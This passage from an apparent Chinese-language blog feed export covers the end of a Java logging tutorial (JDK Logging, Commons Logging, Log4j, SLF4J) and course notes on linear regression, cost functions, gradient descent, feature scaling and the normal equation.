<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserNotFoundException</span> <span class="keyword">extends</span> <span class="title">BaseException</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginFailedException</span> <span class="keyword">extends</span> <span class="title">BaseException</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="使用JDK-Logging">使用JDK Logging</h3>
<p>直接上🌰</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.logging.Level;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Logger logger = Logger.getGlobal();</span><br><span class="line">        logger.info(<span class="string">&quot;start process...&quot;</span>);</span><br><span class="line">        logger.warning(<span class="string">&quot;memory is running out...&quot;</span>);</span><br><span class="line">        logger.fine(<span class="string">&quot;ignore&quot;</span>);</span><br><span class="line">        logger.severe(<span class="string">&quot;process will be terminated...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10月 12, 2019 6:34:55 下午 Hello main</span><br><span class="line">信息: start process...</span><br><span class="line">10月 12, 2019 6:34:55 下午 Hello main</span><br><span class="line">警告: memory is running out...</span><br><span class="line">10月 12, 2019 6:34:55 下午 Hello main</span><br><span class="line">严重: process will be terminated...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>logger.fine(&quot;ignore&quot;);</code>没有打印是因为JDK默认的消息级别是<code>Info</code>：</p>
<ul>
<li>SEVERE</li>
<li>WARNING</li>
<li>INFO</li>
<li>CONFIG</li>
<li>FINE</li>
<li>FINER</li>
<li>FINEST</li>
</ul>
<h3 id="使用Common-Logging">使用Common Logging</h3>
<p>使用 Common Logging只需要两个步骤：</p>
<ul>
<li>通过<code>LogFactory</code>获取<code>Log</code>类的实例</li>
<li>使用<code>Log</code>实例的方法打印日志</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.logging.Log;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.logging.LogFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Log log = LogFactory.getLog(Main.class);</span><br><span class="line">        log.info(<span class="string">&quot;start...&quot;</span>);</span><br><span class="line">        log.warn(<span class="string">&quot;end...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Commons Logging定义了6个日志级别：</p>
<ul>
<li>FATAL</li>
<li>ERROR</li>
<li>WARNING</li>
<li>INFO</li>
<li>DEBUG</li>
<li>TRACE</li>
</ul>
<p>使用Common Logging时，如果在静态方法中引用<code>Log</code>，通常直接定义一个静态类型变量：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> Log log = LogFactory.getLog(Main.class);</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        log.info(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在实例方法中引用<code>Log</code>，通过定义一个实例变量：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Log = LogFactory.getLog(getClass());</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        log.info(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这两种定义的方法区别在于：实例变量log获取方式是<code>LogFactory.getLog(getClass)</code>，这种做法的好处是，子类可以直接使用<code>log</code>实例，例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">&quot;bar&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>此外，Commons Logging的日志方法，例如<code>info()</code>，除了标准的<code>info(String)</code>外，还提供了一个非常有用的重载方法：<code>info(String, Throwable)</code>，这使得记录异常更加简单：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    log.error(<span class="string">&quot;got Exception&quot;</span>, e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="使用Log4j">使用Log4j</h3>
<p>Commons Logging，可以作为“日志接口”来使用，而实现这个接口可以使用Log4j。</p>
<p>我们在使用Log4j框架时，更多时候是通过配置文件来配置它。</p>
<p>以XML配置为例，使用Log4j的时候，我们把一个<code>log4j2.xml</code>的文件放到<code>classpath</code>下就可以让Log4j读取配置文件并按照我们的配置来输出日志。</p>
<p>另外，因为Log4j也是一个第三方库，需要把下面4个jar包放在<code>classpath</code>中：</p>
<ul>
<li>log4j-api-2.x.jar</li>
<li>log4j-core-2.x.jar</li>
<li>log4j-jcl-2.x.jar</li>
<li>commons-logging-1.2.jar</li>
</ul>
<h3 id="使用SLF4J和Logback">使用SLF4J和Logback</h3>
<p>SLF4J类似于Commons Logging，也是一个日志接口，而Logback类似于Log4j，是一个日志的实现。</p>
<p>SLF4J使用方法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Logger = LoggerFactory.getLogger(getClass());</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> bar = <span class="number">100</span>;</span><br><span class="line">        String name = <span class="string">&quot;foo&quot;</span>;</span><br><span class="line">        logger.info(<span class="string">&quot;bar = &#123;&#125; name = &#123;&#125;&quot;</span>, bar, name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>SLF4J使用下面三个jar包：</p>
<ul>
<li>slf4j-api-1.7.x.jar</li>
<li>logback-classic-1.2.x.jar</li>
<li>logback-core-1.2.x.jar</li>
</ul>
<p>和Log4j类似，我们仍然需要一个Logback的配置文件，把<code>logback.xml</code>放到classpath下。</p>
]]></content>
      <categories>
        <category>编程</category>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Machine_Learning-Week1</title>
    <url>/Machine_learning/basic_learning/1.Machine-Learning-Week1/</url>
    <content><![CDATA[<h1 id="Machine-Learning-Week1">Machine_Learning-Week1</h1>
<h3 id="机器学习介绍">机器学习介绍</h3>
<p>什么是机器学习？视频中给出了两种定义，从具体理解来看，我更倾向于Tom Mitchell的定义，原文是：</p>
<blockquote>
<p>A computer program is said to learn from experience E with respect to some class of tasks T and performance measure P, if its performance at tasks in T, as measured by P, improves with experience E.</p>
</blockquote>
<p>用DeepMind下围棋来解释就是：</p>
<p>E：下很多场围棋的体验</p>
<p>T：某一局下棋的任务</p>
<p>P：DeepMind赢得比赛的可能性</p>
<p>总体来说，机器学习可以分为两大类：<strong>监督学习（supervised learning）<strong>和</strong>无监督学习（unsupervised learning）</strong>。</p>
<h4 id="监督学习">监督学习</h4>
<p>在监督学习中，我们事先就有了一个数据集，并且已经知道正确的输出应该是什么样子，并认为输入和输出之间存在某种联系。</p>
<p>监督学习问题分为“<strong>回归（regression）</strong>”和“<strong>分类（classification）</strong>”问题。</p>
<p>在回归问题中，我们试图预测连续输出中的结果，这意味着我们试图将输入变量映射到某个连续函数。</p>
<p>在分类问题中，我们改为尝试预测离散输出中的结果。 换句话说，我们正在尝试将输入变量映射为离散类别。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191025141103.png" alt=""></p>
<p>举例来说：</p>
<p>给定数据，预测房屋的具体价格。判断是回归问题还是分类问题，价格作为规模的函数是一个连续的输出，因此这是一个回归问题。但是，如果我们把输出改变一下，我们可以通过输出关于房屋是否“以高于或低于要价的价格出售”的输出，从而将这个示例转变为分类问题。 在这里，我们根据价格将房屋分为两个离散类别。</p>
<p>所以我们判断一个机器学习的问题是分类问题还是回归问题，我们看的是它的<strong>输出类型</strong>，如果是离散数据那么就是一个分类问题，如果是<strong>连续数据</strong>，那么就是回归问题。</p>
<h4 id="无监督学习">无监督学习</h4>
<p>我们有一些问题，但是不知道答案，我们要做的无监督学习就是按照他们的性质把他们自动地分成很多组，每组的问题是具有类似性质的（比如数学问题会聚集在一组，英语问题会聚集在一组，物理…）。</p>
<p>所有数据只有特征向量没有标签，但是可以发现这些数据呈现出聚群的结构，本质是一个相似的类型的会聚集在一起。把这些没有标签的数据分成一个一个组合，就是聚类（Clustering）。比如Google新闻，每天会搜集大量的新闻，然后把它们全部聚类，就会自动分成几十个不同的组（比如娱乐，科技，政治…），每个组内新闻都具有相似的内容结构。</p>
<p>无监督学习还有一个典型的例子就是鸡尾酒会问题（声音的分离），在这个酒会上有两种声音，被两个不同的麦克风在不同的地方接收到，而可以利用无监督学习来分离这两种不同的声音。注意到这里是无监督学习的原因是，事先并不知道这些声音中有哪些种类（这里的种类就是标签的意思）。</p>
<h3 id="单变量线性回归">单变量线性回归</h3>
<p>什么是线性回归模型？回想一下在回归问题中，我们正在使用输入变量，并试图将输出拟合到连续的预期结果函数中。</p>
<p>那么，具有一个变量的线性回归称为“单变量线性回归”，即根据单个输入值x预测单个输出值y时，使用单变量线性回归。</p>
<h4 id="假设函数（Hypothesis-Function）">假设函数（Hypothesis Function）</h4>
<p>$$<br>
\hat{y} = h_\theta(x) = \theta_0 + \theta_1 x<br>
$$</p>
<p>线性回归模型的假设函数就是一个一元一次多项式，从几何角度来讲，这个函数在坐标轴上反映为一条直线，x是自变量，y是因变量。</p>
<p>举例来说：</p>
<table>
<thead>
<tr>
<th style="text-align:left">input x</th>
<th style="text-align:left">output y</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">0</td>
<td style="text-align:left">4</td>
</tr>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:left">7</td>
</tr>
<tr>
<td style="text-align:left">2</td>
<td style="text-align:left">7</td>
</tr>
<tr>
<td style="text-align:left">3</td>
<td style="text-align:left">8</td>
</tr>
</tbody>
</table>
<p>根据表格中给定的输入和输出，我们可以猜测假设函数为：h<sub>θ</sub>(<em>x</em>)=2+2<em>x</em></p>
<p>但是我们x输入1的话，y输出是4，这与实际给定值偏差了3，所以我们需要寻找一组最合适的θ1和θ2来最佳拟合给定的数据。</p>
<h4 id="代价函数（Cost-Function）">代价函数（Cost Function）</h4>
<p>我们使用代价函数来衡量上面给定的假设函数的精确性，这将假设的所有结果取平均值（实际上是平均值的简化版本），其中将x的输入与实际输出y的输入进行比较。<br>
$$<br>
J(\theta_0, \theta_1) = \dfrac {1}{2m} \displaystyle \sum <em>{i=1}^m \left ( \hat{y}</em>{i}- y_{i} \right)^2  = \dfrac {1}{2m} \displaystyle \sum <em>{i=1}^m \left (h</em>\theta (x_{i}) - y_{i} \right)^2<br>
$$<br>
用符号<code>J</code>来表示代价函数，把这个函数拆开来看一下：<br>
$$<br>
\sum <em>{i=1}^m \left (h</em>\theta (x_{i}) - y_{i} \right)^2<br>
$$<br>
i 为第 i 个数据，上式表示我通过拟合函数 hθ(x) 得到的第 i 个数据与真实的第 i 个数据的误差。总共有 m 个数据，那么我们就应该把 m 个数据的误差求和然后再求出平均误差，得到下面这个式子。<br>
$$<br>
\dfrac {1}{2m} \displaystyle \sum <em>{i=1}^m \left (h</em>\theta (x_{i}) - y_{i} \right)^2<br>
$$</p>
<blockquote>
<p>其实除以 m 或 2m 代价函数最优化的结果都是相同的，这里为了后续求导计算方便，因此用 2m处理。</p>
</blockquote>
<p>只要我让这个值尽可能的小，那么我们所做的拟合函数就越准确，所以刚才求拟合函数的问题就转化成了通过 θ0 和 θ1 求 J(θ0, θ1) 的最小值，及最优化问题。</p>
<p>讲到这里，有必要对上面的知识点进行一些小的总结：</p>
<ul>
<li>
<p>首先给了一个假设函数：</p>
<p><strong>Hypothesis</strong>：</p>
</li>
</ul>
<p>$$<br>
\hat{y} = h_\theta(x) = \theta_0 + \theta_1 x<br>
$$</p>
<ul>
<li>
<p>代价函数中的θ0和θ1是任意的，那么我们就需要一个函数来判断这个假设函数与真实数据之间的拟合度如何，为了描述拟合度，我们又提出了代价函数：<br>
$$<br>
J(\theta_0, \theta_1) = \dfrac {1}{2m} \displaystyle \sum <em>{i=1}^m \left ( \hat{y}</em>{i}- y_{i} \right)^2  = \dfrac {1}{2m} \displaystyle \sum <em>{i=1}^m \left (h</em>\theta (x_{i}) - y_{i} \right)^2<br>
$$</p>
</li>
<li>
<p>我们的目标当然是代价函数的值越小越好，即用数学公式表示为：<br>
$$<br>
\min_{\theta_1,\theta_2} J(\theta_1,\theta_2)<br>
$$</p>
</li>
</ul>
<p>为了说明代价函数是如何进行工作的，现在我们来简化一下问题，让 θ0=0，这样我们要求的拟合函数就是一条过原点的直线，参数就剩下一个 θ1，θ1 代表直线的斜率。如下图所示，我想要拟合左图中的 3 个点，我就要取不同的参数 θ1 进行尝试，θ1 取值不同，直线的颜色不同。这里 θ1 分别取 0, 0.5, 1，直线的颜色分别为深蓝、紫色和浅蓝色。如何确定哪条直线拟合的最好呢，我们就要把 θ1 的不同取值带入到代价函数 J(θ1) 中（右图）。这里我们就发现，当 θ1=1 时，代价函数值最小为 0，那么我们就找到了拟合函数 hθ(x)= θ1x 的最佳参数 θ1=1。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191025173354.png" alt=""></p>
<p>如果有两个参数 θ0 和 θ1，那么他们的代价函数图像就是一个三维图像。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191025175204.png" alt=""></p>
<p>用轮廓图画出来的话就是这样（轮廓图类似于等高线图）</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191025175316.png" alt=""></p>
<p>右边的轮廓图一圈就相当于左边的同一条直线。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191025175514.png" alt=""></p>
<p>我们可以发现，越往轮廓图的中心位置移动，假设函数与真实数据就更加拟合。</p>
<p>如果是每次要我们人工去寻找这个最低点，未免也太不“人工智能”了。 有没有一种算法可以自动地求出使得代价函数最小的点呢？有，那就是<strong>梯度下降</strong>。 （又到了最优化的问题了）</p>
<h3 id="梯度下降（Gradient-Descent）">梯度下降（Gradient Descent）</h3>
<p>**梯度下降（Gradient descent）**是一个用来求代价函数最小值的算法。梯度下降算法的思想就是首先先从一组参数值（θ0, θ1）开始，不断地去尝试各种（θ0, θ1），直到使得代价函数 J(θ0, θ1) 最小为止。以下图代价函数为例，从不同起始点开始，到达的局部最优位置不同，也就是局部最优解不同。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191025180157.png" alt=""></p>
<p>梯度下降算法用以下伪代码表示：</p>
<p>repeat until convergence:<br>
$$<br>
\theta_j := \theta_j - \alpha \frac{\partial}{\partial \theta_j} J(\theta_0, \theta_1)<br>
$$<br>
具体应用到线性回归算法当中，算法表现为：（也就是把代价函数代入上式中）</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191025181247.png" alt=""></p>
<p>在每一次迭代的过程中，<strong>必须同时更新θ0和θ1的值</strong>，即：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191025181749.png" alt=""></p>
<p>再稍微解释一下这个算法：</p>
<p>首先是一个循环结构，当不能再更新θ0, θ1时循环停止，<code>:=</code>是一个赋值号，<code>α</code>是学习速率，也就是下山每次迈出多大步子，后面紧跟着的是一个偏导数。 用几何图形来解释显得更为直观，不妨设θ0=0：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191025182246.png" alt=""></p>
<p>其中 α 后面的导数就代表着这一点的斜率，每次 θ1 更新都是减去一个 α与该点的斜率之积，当下降到局部最小处时，导数恰好为零，此时 θ1 不再更新，就得到了我们想要的结果 ，如下图所示：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191025182401.png" alt=""></p>
<p>对于α的取值还是比较讲究的，如果α太大， 会出现下图中的情况，直接跳过局部最优解，一直循环，而且离局部最优解会越来越远。如果α太小，寻找局部最优解的速率会特别特别慢。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191025182534.png" alt=""></p>
<h3 id="线性回归的梯度下降算法">线性回归的梯度下降算法</h3>
<p>到现在，我们已经学过了线性<strong>回归模型</strong>、<strong>代价函数</strong>和<strong>梯度下降</strong>，这三个算法就可以组成我们今天要学到的第一个机器学习算法：<strong>线性回归的梯度下降算法 （Gradient Descent For Linear Regression）</strong></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191030105814.png" alt=""></p>
<p>左边是梯度下降算法，右边是线性回归模型和代价函数。</p>
<p>分别求出 j=0 和 j=1 时代价函数的偏导数：<br>
$$<br>
\frac{\partial}{\partial \theta_0} J(\theta_0, \theta_1)=\dfrac {1}{m} \displaystyle \sum <em>{i=1}^m \left (h</em>\theta (x^{(i)}) - y^{(i)} \right)<br>
$$<br>
和<br>
$$<br>
\frac{\partial}{\partial \theta_1} J(\theta_0, \theta_1)=\dfrac {1}{m} \displaystyle \sum <em>{i=1}^m \left ((h</em>\theta (x^{(i)}) - y^{(i)} \right)x^{(i)}<br>
$$<br>
那么，把一般性的梯度下降算法应用到线性回归模型的时候，就可以得出一个新的具体形式：<br>
$$<br>
\begin{align*} \text{repeat until convergence: } \lbrace &amp; \newline \theta_0 := &amp; \theta_0 - \alpha \frac{1}{m} \sum\limits_{i=1}^{m}(h_\theta(x_{i}) - y_{i}) \newline \theta_1 := &amp; \theta_1 - \alpha \frac{1}{m} \sum\limits_{i=1}^{m}\left((h_\theta(x_{i}) - y_{i}) x_{i}\right) \newline \rbrace&amp; \end{align*}<br>
$$<br>
这个算法也叫做<strong>批量梯度下降（Batch Gradient Descent ）</strong>，他的特点就是每次进行梯度下降都要使用整个数据集。</p>
]]></content>
      <categories>
        <category>机器学习</category>
        <category>基础入门</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>线性回归</tag>
      </tags>
  </entry>
  <entry>
    <title>Machine-Learning-Week2</title>
    <url>/Machine_learning/basic_learning/2.Machine-Learning-Week2/</url>
    <content><![CDATA[<h1 id="Machine-Learning-Week2">Machine-Learning-Week2</h1>
<h3 id="多元线性回归">多元线性回归</h3>
<p>在上一周我们学了单变量线性回归方程及其梯度下降算法。但在实际运用的过程中，特征肯定是多样的，所以我们需要根据单变量线性回归方程推演出多元线性回归方程。比如说，一个二手房的价格可能会由房屋面积（Size）、房间数量（Number of bedrooms）、楼层数（Number of floor）、房屋年限（Age of home）这四个特征决定，如下图所示：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191031143745.png" alt=""></p>
<p>x<sup>(i)</sup>表示第i条训练样本，x<sup>(i)</sup><sub>j</sub>表示第i条训练样本的第j个特征。</p>
<p>所以我们得到的线性回归函数为：<br>
$$<br>
h_\theta (x) = \theta_0 + \theta_1 x_1 + \theta_2 x_2 + \theta_3 x_3 + \cdots + \theta_n x_n<br>
$$<br>
如果把该函数的参数 θ 和变量 x 全部写成向量的形式，并且不妨假设<code>x0=1</code>就可以简化成下面这个函数：<br>
$$<br>
\begin{align*}h_\theta(x) =\begin{bmatrix}\theta_0 \hspace{2em}  \theta_1 \hspace{2em}  …  \hspace{2em}  \theta_n\end{bmatrix}\begin{bmatrix}x_0 \newline x_1 \newline \vdots \newline x_n\end{bmatrix}= \theta^T x\end{align*}<br>
$$<br>
进一步来讲，如果我们把上图的训练样本逐行的写到矩阵当中，且记为X，即（假设只有三条数据）：<br>
$$<br>
\begin{align*}X = \begin{bmatrix}x^{(1)}_0 &amp; x^{(1)}_1 &amp; x^{(1)}_2 &amp; x^{(1)}_3 &amp; x^{(1)}_4  \newline x^{(2)}_0 &amp; x^{(2)}_1 &amp; x^{(2)}_2 &amp; x^{(2)}_3 &amp; x^{(2)}_4  \newline x^{(3)}_0 &amp; x^{(3)}_1 &amp; x^{(3)}_2 &amp; x^{(3)}_3 &amp; x^{(3)}_4 \end{bmatrix}&amp;,\theta = \begin{bmatrix}\theta_0 \newline \theta_1 \newline \theta_2 \newline \theta_3 \newline \theta_4 \newline\end{bmatrix}\end{align*}<br>
$$<br>
那么假设函数就可以写为：</p>
<p>h<sub>θ</sub>(X)=Xθ</p>
<p>得到的结果就是一个m*1的向量。</p>
<h4 id="多元梯度下降">多元梯度下降</h4>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191031170034.png" alt=""></p>
<p>上一篇学会了单变量的梯度下降算法，对于多元梯度下降算法，也就是一个照葫芦画瓢的过程了：<br>
$$<br>
\begin{align*}<br>
&amp; \text{repeat until convergence:} ; \lbrace \newline<br>
; &amp; \theta_0 := \theta_0 - \alpha \frac{1}{m} \sum\limits_{i=1}^{m} (h_\theta(x^{(i)}) - y^{(i)}) \cdot x_0^{(i)}\newline<br>
; &amp; \theta_1 := \theta_1 - \alpha \frac{1}{m} \sum\limits_{i=1}^{m} (h_\theta(x^{(i)}) - y^{(i)}) \cdot x_1^{(i)} \newline<br>
; &amp; \theta_2 := \theta_2 - \alpha \frac{1}{m} \sum\limits_{i=1}^{m} (h_\theta(x^{(i)}) - y^{(i)}) \cdot x_2^{(i)} \newline<br>
&amp; \cdots<br>
\newline \rbrace<br>
\end{align*}<br>
$$<br>
即：<br>
$$<br>
\begin{align*}&amp; \text{repeat until convergence:} ; \lbrace \newline ; &amp; \theta_j := \theta_j - \alpha \frac{1}{m} \sum\limits_{i=1}^{m} (h_\theta(x^{(i)}) - y^{(i)}) \cdot x_j^{(i)} ;  &amp; \text{for j := 0…n}\newline \rbrace\end{align*}<br>
$$</p>
<h4 id="特征放缩和归一化">特征放缩和归一化</h4>
<p>如果你想预测房价，现在有两个变量 x1 和 x2 来作为特征，其中 x1 为房子的大小，范围在 0 到 2000，x2 为房子中卧室的数目，范围在 0 到 5，那么画出这个代价函数的轮廓图就是这个样子，一个扁扁的椭圆形：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191031180027.png" alt=""></p>
<p>对这个函数进行梯度下降，就是途中蓝线的过程，这个路程很长很曲折，这样我们进行梯度下降所花费的时间就会很长。</p>
<p>为了使特征值在一个相似的范围内变化（比如-1到+1之间），可以将变量进行特征放缩，如下图所示：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191031180132.png" alt=""></p>
<p>但是又出现一个问题，你会发现，现在经过处理之后的数据全是正值，不分散，那么我们就要用稍微复杂一点的方法进行特征缩放。用**均值归一化（Mean normalization）**的方法处理数据：<br>
$$<br>
x_n = \frac{x_n - μ_n}{s_n}<br>
$$<br>
其中 μn 为平均值，Sn 为标准差，也可以用这个变量最大值与最小值的差。现在你就会发现，数据既有正值也有负值，分散在-1 到 1 这个区间，进行梯度下降就会很快。</p>
<h4 id="迭代的有效性">迭代的有效性</h4>
<p>我们知道梯度下降算法是一个递归的过程，那么我们如何确定这个递归的方向是正确的呢？视频中给出了两种方法。</p>
<h5 id="Debugging-gradient-descent">Debugging gradient descent</h5>
<p>以X轴为迭代次数，Y轴为每次迭代的代价函数值来作图，如果图像是一个下降的过程，并在最后趋于平缓，那么这种迭代是有效的。如果图像是一个上升的过程，那么应该试着减小α的值。</p>
<h5 id="Automatic-convergence-test">Automatic convergence test</h5>
<p>通过设定一个阈值ε（比如ε=10<sup>-3</sup>），如果每次迭代之后，代价函数的减少量小于阈值ε，那么就认定迭代是有效的。但是这种方法在实际应用中，并不太容易去确定阈值ε。</p>
<h4 id="多项式回归方程">多项式回归方程</h4>
<p>如果假设函数不能很好地拟合数据，则它不一定必须是一个线性的（直线）。我们可以通过将其设为二次，三次或平方根函数（或任何其他形式）来更改假设函数的行为。比如说根据面积的大小来预测房价，如果给定的数据集如下图所示：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191101135532.png" alt=""></p>
<p>那么我们可以把假设函数变为三次函数或平方根函数（因为二次函数在最大值之后会下降，这不符合实际情况）,即：<br>
$$<br>
h_\theta(x) = \theta_0 + \theta_1 x_1 + \theta_2 x_1^2 + \theta_3 x_1^3<br>
$$<br>
或者：<br>
$$<br>
h_\theta (x) = \theta_0 + \theta_1 x_1 + \theta_2 \sqrt {x_1}<br>
$$</p>
<blockquote>
<p>这个时候特征放缩就显得尤为重要。</p>
</blockquote>
<h4 id="正规方程（Normal-Equation）">正规方程（Normal Equation）</h4>
<p>“正规方程”是一种无需迭代即可找到最佳θ的方法，公式如下：<br>
$$<br>
\theta = (X^T X)^{-1} X^T y<br>
$$</p>
<blockquote>
<p>无需对正规方程进行特征缩放。</p>
</blockquote>
<p>举个例子，还是求房价，现在有 4 组训练集，如下表：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191101141117.png" alt=""></p>
<p>在这个例子中，矩阵X为：<br>
$$<br>
\begin{align*}X = \begin{bmatrix}1 &amp; 2014 &amp; 5 &amp; 1 &amp; 45 \newline 1 &amp; 1416 &amp; 3 &amp; 2 &amp; 40  \newline 1 &amp; 1534 &amp; 3 &amp; 2 &amp; 40 \newline 1 &amp; 852 &amp; 2 &amp; 1 &amp;36 \end{bmatrix} \end{align*}<br>
$$<br>
向量y为：<br>
$$<br>
\begin{align*} y = \begin{bmatrix} 460 \newline 232 \newline 315 \newline 178 \end{bmatrix} \end{align*}<br>
$$<br>
这样通过正规方程就可以很容易地求出参数 θ（一定要注意，这里的参数 θ 是一个向量）。</p>
<p>既然求参数 θ 有两种方法，一个为<strong>梯度下降法</strong>，一个为<strong>正规方程</strong>，那么他俩之间一定会有优缺点，下表就是这两种方法的优缺点的对比：</p>
<table>
<thead>
<tr>
<th style="text-align:left">梯度下降</th>
<th style="text-align:left">正规方程</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">需要选择学习速率α</td>
<td style="text-align:left">不需要选择学习速率</td>
</tr>
<tr>
<td style="text-align:left">需要迭代</td>
<td style="text-align:left">不需要迭代</td>
</tr>
<tr>
<td style="text-align:left">时间复杂度O (kn<sup>2</sup>)</td>
<td style="text-align:left">O (n<sup>3</sup>), 需要计算X<sup>T</sup>X的逆矩阵</td>
</tr>
<tr>
<td style="text-align:left">当特征值很多的时候，效率也很高</td>
<td style="text-align:left">当特征值很多的时候，效率很低（要求逆矩阵）</td>
</tr>
</tbody>
</table>
<p>既然要求逆矩阵，那么就肯定会出现X<sup>T</sup>X不可逆的时候。</p>
<p><strong>第一种情况：</strong> 出现了两个相似的特征，这个两个特征可以用一个线性关系进行表示。例如，米和英尺，这两个都是用来描述长度的单位，且他们之间可以进行相互转化，如果特征值同时出现他们两个，就会出现矩阵不可逆的情况。</p>
<p><strong>解决方法</strong>：去掉任意一个即可。</p>
<p><strong>第二种情况</strong>：特征值的数量特别多，但是数据集的数量特别少。</p>
<p><strong>解决方法</strong>：增加数据集或减少特征值。</p>
]]></content>
      <categories>
        <category>机器学习</category>
        <category>基础入门</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>线性回归</tag>
      </tags>
  </entry>
  <entry>
    <title>Machine-Learning-Week3</title>
